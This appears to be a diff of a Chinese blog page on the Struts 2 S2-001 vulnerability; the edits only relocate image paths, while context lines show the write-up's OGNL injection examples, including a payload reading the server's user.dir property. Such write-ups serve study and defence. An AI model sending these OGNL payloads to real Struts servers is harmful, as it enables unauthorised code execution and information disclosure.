@@ -87,16 +87,16 @@
 <meta property="og:site_name" content="BruceWang&#39;s Blog">
 <meta property="og:description" content="转自&amp;nbsp;王小龍的博客 漏洞原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Struts&amp;nbsp;2&amp;nbsp;框架的表单验证机制（&amp;nbsp;Validation&amp;nbsp;）主要依赖于两个拦截器：validation&amp;nbsp;和&amp;nbsp;workflow。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validation&amp;nbsp;拦截器工作时，会根据&amp;nbsp;XML&amp;n">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://blog.bruce.wang/images/7053164-5ff9bd5a4dca0cd5.png">
-<meta property="og:image" content="https://blog.bruce.wang/images/7053164-040a84c2725c327b.png">
-<meta property="og:image" content="https://blog.bruce.wang/images/7053164-a0e6f8d3f63a314b.png">
-<meta property="og:image" content="https://blog.bruce.wang/images/7053164-e145aa599a14ace0.png">
-<meta property="og:image" content="https://blog.bruce.wang/images/7053164-e5d8cf4514e8410d.png">
-<meta property="og:updated_time" content="2019-07-15T07:44:57.198Z">
+<meta property="og:image" content="https://blog.bruce.wang/images/2017/12/7053164-5ff9bd5a4dca0cd5.png">
+<meta property="og:image" content="https://blog.bruce.wang/images/2017/12/7053164-040a84c2725c327b.png">
+<meta property="og:image" content="https://blog.bruce.wang/images/2017/12/7053164-a0e6f8d3f63a314b.png">
+<meta property="og:image" content="https://blog.bruce.wang/images/2017/12/7053164-e145aa599a14ace0.png">
+<meta property="og:image" content="https://blog.bruce.wang/images/2017/12/7053164-e5d8cf4514e8410d.png">
+<meta property="og:updated_time" content="2019-07-15T07:52:02.415Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Struts 2 漏洞系列之 S2-001">
 <meta name="twitter:description" content="转自&amp;nbsp;王小龍的博客 漏洞原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Struts&amp;nbsp;2&amp;nbsp;框架的表单验证机制（&amp;nbsp;Validation&amp;nbsp;）主要依赖于两个拦截器：validation&amp;nbsp;和&amp;nbsp;workflow。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validation&amp;nbsp;拦截器工作时，会根据&amp;nbsp;XML&amp;n">
-<meta name="twitter:image" content="https://blog.bruce.wang/images/7053164-5ff9bd5a4dca0cd5.png">
+<meta name="twitter:image" content="https://blog.bruce.wang/images/2017/12/7053164-5ff9bd5a4dca0cd5.png">
 
 
 
@@ -349,24 +349,24 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"requiredstring"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span>You must enter a name<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"min"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"max"</span>&gt;</span>19<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span>Only people ages 13 to 19 may take this quiz<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>&nbsp;&nbsp;&nbsp;&nbsp;测试&nbsp;Demo&nbsp;界面效果图如下：</p>
-<p><img src="https://blog.bruce.wang/images/7053164-5ff9bd5a4dca0cd5.png" alt="S2-001 DEMO"></p>
+<p><img src="https://blog.bruce.wang/images/2017/12/7053164-5ff9bd5a4dca0cd5.png" alt="S2-001 DEMO"></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;现在我们来模拟恶意用户：</p>
 <ul>
 <li>1.&nbsp;POST&nbsp;提交正常数据：<code>name=test&amp;age=14&amp;answer=black</code>，回显正常。效果如下：</li>
 </ul>
-<p><img src="https://blog.bruce.wang/images/7053164-040a84c2725c327b.png" alt="测试"></p>
+<p><img src="https://blog.bruce.wang/images/2017/12/7053164-040a84c2725c327b.png" alt="测试"></p>
 <ul>
 <li>2.&nbsp;POST&nbsp;提交触发验证错误的正常数据：<code>name=test&amp;age=10&amp;answer=black</code>，回显输入内容并提示触发了表单验证错误。效果如下：</li>
 </ul>
-<p><img src="https://blog.bruce.wang/images/7053164-a0e6f8d3f63a314b.png" alt="测试"></p>
+<p><img src="https://blog.bruce.wang/images/2017/12/7053164-a0e6f8d3f63a314b.png" alt="测试"></p>
 <ul>
 <li>3.&nbsp;POST&nbsp;提交特殊构造的恶意数据：<code>name=%{11+12}&amp;age=10&amp;answer=%{2017+2018}</code>，回显恶意&nbsp;OGNL&nbsp;表达式的执行结果，并提示触发了表单验证错误。效果如下：</li>
 </ul>
-<p><img src="https://blog.bruce.wang/images/7053164-e145aa599a14ace0.png" alt="测试"></p>
+<p><img src="https://blog.bruce.wang/images/2017/12/7053164-e145aa599a14ace0.png" alt="测试"></p>
 <ul>
 <li>4.&nbsp;POST&nbsp;提交攻击代码：<code>name=%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}&amp;age=10&amp;answer=%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code>，回显攻击代码的执行结果，镔铁提示触发了表单验证错误。效果如下：</li>
 </ul>
-<p><img src="https://blog.bruce.wang/images/7053164-e5d8cf4514e8410d.png" alt="测试"></p>
+<p><img src="https://blog.bruce.wang/images/2017/12/7053164-e5d8cf4514e8410d.png" alt="测试"></p>
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;本文所提供的&nbsp;POC&nbsp;仅供研究学习，请勿用于非法用途！</p>
 <ul>
 <li>获取tomcat执行路径：</li>
